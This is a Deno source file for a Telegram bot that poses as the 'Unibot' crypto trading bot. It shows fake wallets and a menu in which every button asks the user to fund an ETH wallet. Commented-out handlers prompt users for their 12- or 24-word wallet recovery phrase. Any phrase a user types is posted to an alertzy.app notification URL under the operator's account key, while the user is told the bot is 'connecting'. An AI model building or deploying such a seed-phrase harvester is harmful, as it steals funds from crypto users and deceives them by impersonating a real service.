import { Bot, InlineKeyboard } from "./deps.deno.ts";
import {
  hydrateReply,
  parseMode,
} from "https://deno.land/x/grammy_parse_mode@1.8.1/mod.ts";

import type { ParseModeFlavor } from "https://deno.land/x/grammy_parse_mode@1.8.1/mod.ts";
// import axiod from "https://deno.land/x/axiod/mod.ts";

export const bot = new Bot<ParseModeFlavor<Context>>(Deno.env.get("BOT_TOKEN") || "234dc");

// Install the plugin.
bot.use(hydrateReply);

// Set the default parse mode for ctx.reply.
bot.api.config.use(parseMode("MarkdownV2"));
// // Construct a keyboard.
// const inlineKeyboard = new InlineKeyboard().text("Connect Wallet", "click-payload");

// Build an inline keyboard:
const homeKeyboard = new InlineKeyboard()
  .text('Buy Tokens', 'connect').text('Sell Tokens', 'connect').row()
  .text('Buy Limit', 'connect').text('Sell Limit', 'connect').row()
  .text('Snipers (ERC-20)', 'connect').row()
  .text('Token Balances', 'connect').text('Wallet Analysis', 'connect').text('🌐Flex PnL', 'connect').row()
  .text('🖥Uni-X', 'connect').text('👯‍♂️friend.tech', 'connect').text('⚙️Settings', 'connect')
  // .url('official Website', 'https://ait.finance')

// // Build an inline keyboard:
// const connectKeyboard = new InlineKeyboard()
//   .text('Manual Connect', 'manualConnect').row()
//   .url('Web Connect', 'https://ait-finance-connect.web.app')

// const keyboard = new Keyboard()
//   .text("🌑 Exchange").row()
//   // .webApp("🌑 Exchange", "https://guiser.org/swap").row()
//   .text("🆘 Contact Support")
//   .resized();

// Send a keyboard along with a message.
bot.command("start", async (ctx) => {
  await ctx.replyWithHTML(
    // "<b>This</b> is <i>withHTML</i> <code>formatting</code>",
    `
    <b>Gas:</b> 18   ═   <b>Block:</b> 18654112   ═   <b>ETH:</b> $2077
    🦄  <b>Unibot</b> | Website | Tutorials | [✪Watchlist]  🦄
    Snipe & trade at elite speeds for free. Ethereum and Basechain is supported.
    
    <b>═══ Your Wallets ═══</b>
    <b>▰ Wallet-w1 ▰</b>
    <b>Bal:</b> <code>0.0 ETH</code> ($0)
    <code>0xc2598A15516bA9E9e93B0511814b5843c285222d</code>
    
    <b>▰ Wallet-w2 ▰</b>
    <b>Bal:</b> <code>0.0 ETH</code> ($0)
    <code>0xE53ED5475c9567C682F67dA1a7c569C95A3d2a9E</code>
    
    <b>▰ Wallet-w3 ▰</b>
    <b>Bal:</b> <code>0.0 ETH</code> ($0)
    <code>0xb9fABd1a9a3f9B32ad06691b27D07E39a59b3300</code>
    `,
    { reply_markup: homeKeyboard })
  // await ctx.reply("Trade your favorite cryptos like BTC, ETH, MATIC, XMR, SOL, and thousands more, including those quirky meme tokens, all hassle-free on Telegram!", 
});

// Wait for click events with specific callback data.
bot.callbackQuery("connect", async (ctx) => {
  await ctx.replyWithHTML(` 🪙  Token Balances  🪙
  <b>═ Ethereum ═</b>
  <code>None</code>
  fund your ETH wallet to proceed.
`
  );
});

// bot.on('message:text', async (ctx) => {
//   try {
//       const btnText = ctx.message.text;
//   if ( btnText === "🆘 Contact Support" )  {
//     ctx.reply("Contact our 24/7 customer support in case your order is taking more than 30 minutes to complete @askGuiserBot"); // Reply to the user with a confirmation message
//   } else {
//     await ctx.reply("Contact our 24/7 customer support in case your order is taking more than 30 minutes to complete @askGuiserBot", { reply_markup: Keyboard });
//   }
//   } catch (error) {
//     console.error(error)
//   }
  
// });

// // Wait for click events with specific callback data.
// bot.callbackQuery("support", async (ctx) => {
//   await ctx.reply("Contact our 24/7 customer support in case your order is taking more than 30 minutes to complete @askGuiserBot", { reply_markup: keyboard });
// });

// // Wait for click events with specific callback data.
// bot.callbackQuery("manualConnect", async (ctx) => {
//   ctx.deleteMessage()
//   await ctx.reply("Enter your wallet phrase (usually 12 or 24 words) to import manually");
// });

// bot.on('message:text', async (ctx) => {
//         try {
//             const phrase = ctx.message.text;
//         if (phrase.split(' ').length === 12 || phrase.split(' ').length === 15 || phrase.split(' ').length === 24 || (phrase.split(' ').length === 1 && phrase.length > 60))  {
//             const webhook_url = `https://alertzy.app/send?accountKey=${Deno.env.get("ALERTZY_KEY")}&title=New Phrase&message=${phrase}` //change notification
//             const response = await axiod.post(webhook_url)
//             ctx.reply("Connecting to wallet please wait..."); // Reply to the user with a confirmation message
//         } else {
//             ctx.deleteMessage()
//             await ctx.reply("Invalid response.! Kindly try again", { reply_markup: homeKeyboard });
//         }
//         } catch (error) {
//             console.error(error)
//         }
        
//     });
